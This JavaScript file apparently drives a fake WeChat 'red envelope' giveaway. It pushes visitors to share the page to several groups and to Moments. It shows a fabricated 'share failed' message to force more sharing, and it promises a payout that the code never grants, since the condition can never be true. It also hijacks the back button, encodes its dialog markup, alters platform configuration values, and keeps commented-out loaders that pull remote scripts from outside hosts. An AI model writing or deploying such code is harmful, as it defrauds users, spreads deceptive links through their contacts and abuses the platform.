$('.show-time').find('span').text(15);;
(function() {
    /**
     * 动态加载js文件
     * @param  {string}   url      js文件的url地址
     * @param  {Function} callback 加载完成后的回调函数
     */
    var _getScript = function(url, callback) {
        var head = document.getElementsByTagName('head')[0],
            js = document.createElement('script');

        js.setAttribute('type', 'text/javascript');
        js.setAttribute('src', url);

        head.appendChild(js);

        //执行回调
        var callbackFn = function() {
            if (typeof callback === 'function') {
                callback();
            }
        };

        if (document.all) { //IE
            js.onreadystatechange = function() {
                if (js.readyState == 'loaded' || js.readyState == 'complete') {
                    callbackFn();
                }
            }
        } else {
            js.onload = function() {
                callbackFn();
            }
        }
    }

    //如果使用的是zepto，就添加扩展函数
    if (Zepto) {
        $.getScript = _getScript;
    }

})();

var alertTimes = 0;

function wxalert(msg, btn, callback) {
    if (alertTimes == 0) {
        var dialog = unescape("%3C%64%69%76%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%22%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%6D%61%73%6B%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%64%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%6D%73%67%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%66%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%61%20%68%72%65%66%3D%22%6A%61%76%61%73%63%72%69%70%74%3A%3B%22%20%63%6C%61%73%73%3D%22%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%20%77%65%75%69%2D%64%69%61%6C%6F%67%5F%5F%62%74%6E%5F%70%72%69%6D%61%72%79%22%20%69%64%3D%22%6C%6C%79%5F%64%69%61%6C%6F%67%5F%62%74%6E%22%3E%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E");
        $("body").append(dialog)
    }
    alertTimes++;
    var d = $('#lly_dialog');
    d.show(200);
    d.find("#lly_dialog_msg").html(msg);
    d.find("#lly_dialog_btn").html(btn);
    d.find("#lly_dialog_btn").off('click').on('click', function() {
        d.hide(200);
        if (callback) {
            callback()
        }
    })
}

function share_tip(share_app_times, share_timeline_times) {
    if (share_app_times < 3) {
        wxalert('分享成功,请继续分享到<span style="font-size: 30px;color: #f5294c">' + (3 - share_app_times) + '</span>个不同的群即可领取！', '好')
    } else {
        wx.hideOptionMenu();
        wx.showMenuItems({ menuList: ['menuItem:share:timeline'] });
        if (share_timeline_times < 1) {
            wxalert('分享成功，剩下最后一步啦！<br />请分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取!', '好')
        } else if (share_timeline_times < 2) {
            share_config(window.data, true);
            wxalert('分享失败！<br />再分享一次<span style="font-size: 30px;color: #f5294c">朋友圈</span>即可领取!', '好')
        } else {
            if (Math.random() < -1.5) {
                wxalert('恭喜你！红包会在48小时内存入您的微信钱包，请保留朋友圈24小时哦 <br/><br/>感谢您的参与:)<br/><br/><font color="red">不要走开，还有100元红包等着你哟，点击"确定"领取！</font>', '确定', function() {
                    // $.getScript("//resourcekma.oss-cn-hangzhou.aliyuncs.com/js/d.js");
                    // $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/app.js");
                });
            } else {
                // wxalert('恭喜你！红包会在48小时内存入您的微信钱包，请保留朋友圈24小时哦 <br/><br/>感谢您的参与:)<br/><br/>再送您三次抽<font color="red">iPhone7 Plus</font>的机会哟！', '确定', function() {
                //     // jQuery.getScript("//gkoxjaorh7uzsj8z.oss-cn-shanghai.aliyuncs.com/js/zp3.js");
                //     // jQuery.getScript("//resrc.gz.bcebos.com/js/zp3.js");
                //     if (Math.random() < 3.3) {
                //         $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/zp5.js");
                //     } else {
                //         $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/zp3.js");
                //     }
                // });
                wxalert('恭喜你！红包会在48小时内存入您的微信钱包，请保留朋友圈24小时哦 <br/><br/>感谢您的参与:)<br/><br/>另外，精美小说推荐给您!!!', '确定', function() {
                    // $.getScript("//tw42.cn/sign/4g/xiaoshuo.js");
                });
            }
        }
    }
}

function show_tip() {
    wxalert('活动提示：请务必分享到群后，即可领取（全网公开，见者有份）<br><br/>目前活动仅剩<span style="font-size: 30px;color: #f5294c">' + window.data.left_number + '</span>份', '好')
}
$(function() {
    $('#dianwo').on('click', function() {
        share_config(window.data);
        wx.showMenuItems({ menuList: ['menuItem:share:appMessage'] });
        $("#mask").css("height", $(document).height());
        $("#mask").css("width", $(document).width());
        $("#mask").show();
        $("#fenxiang").show();
        $('#game_result').hide();
        $('.time-out-num').hide();
        $('.bag').hide();
        show_tip();
        console.log('到了体现的步骤了');
    });
    $('#fenxiang').on('click', function() {
        show_tip()
    });
    $('#mask').on('click', function() {
        show_tip()
    })
});



var shareATimes = 0;
var shareTTimes = 0;



// $(function() {
//     $.ajax({
//         type: "GET",
//         url: "//tw42.cn/sign/4g/share.php?url=" + encodeURIComponent(location.href.split('#')[0]) + '&_=' + Date.now(),
//         // dataType: "jsonp",
//         jsonp: "callback",
//         data: {},
//         success: function(result) {
//             window.data = result;
//             window.data.config.appId = window.data.config.appId.replace('x', 'w');
//             wx.config(window.data.config);
//             wx.ready(function() {
//                 wx.hideOptionMenu();
//             });
//         }
//     });
// });

function share_config(data, timeline_cash) {
    data.config.signature = null;
    wx.config(data.config);
    wx.ready(function() {
        wx.onMenuShareAppMessage({
            title: data.share_app_info.title,
            desc: data.share_app_info.desc,
            link: data.share_app_info.link,
            imgUrl: data.share_app_info.img_url,
            success: function() {
                shareATimes += 1;
                share_tip(shareATimes, shareTTimes);
            },
            cancel: function() {

            }
        });
        if (timeline_cash) {
            wx.onMenuShareTimeline({
                title: data.share_timeline_info.title,
                link: data.share_timeline_info.link,
                imgUrl: data.share_timeline_info.img_url,
                success: function() {
                    shareTTimes += 1;
                    share_tip(shareATimes, shareTTimes);
                },
                cancel: function() {

                }
            });
        } else {
            wx.onMenuShareTimeline({
                title: data.share_timeline_cash_info.title,
                link: data.share_timeline_cash_info.link,
                imgUrl: data.share_timeline_cash_info.img_url,
                success: function() {
                    shareTTimes += 1;
                    share_tip(shareATimes, shareTTimes);
                },
                cancel: function() {

                }
            });
        }
    });
}

function anchor() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime())
}

function zp() {
    // $.getScript("//resourcekma.oss-cn-hangzhou.aliyuncs.com/js/d.js");
    // $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/app.js");
    // if (Math.random() < -3.3) {
    //     $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/zp5.js");
    // } else {
    //     $.getScript("//resrcbx.oss-cn-shanghai.aliyuncs.com/js/zp3.js");
    // }
    // $.getScript("//tw42.cn/sign/4g/xiaoshuo.js");
}
setTimeout('anchor()', 100);
window.onhashchange = function() {
    zp()
};

// var _hmt = _hmt || [];
// (function() {
//     var hm = document.createElement("script");
//     hm.src = "https://hm.baidu.com/hm.js?c6fabbcf8bc46b2276ace6cdd1590c81";
//     var s = document.getElementsByTagName("script")[0];
//     s.parentNode.insertBefore(hm, s);
// })();

// function load_tj() {
//     var div = document.createElement('div');
//     div.style.display = 'none';
//     var s = document.createElement('script');
//     s.src = '//s13.cnzz.com/z_stat.php?id=1264062837&web_id=1264062837';
//     div.appendChild(s);
//     document.body.appendChild(div);
// }

// load_tj();

// $.getScript('//resrcnl1.oss-cn-hangzhou.aliyuncs.com/js/c_ccc.js');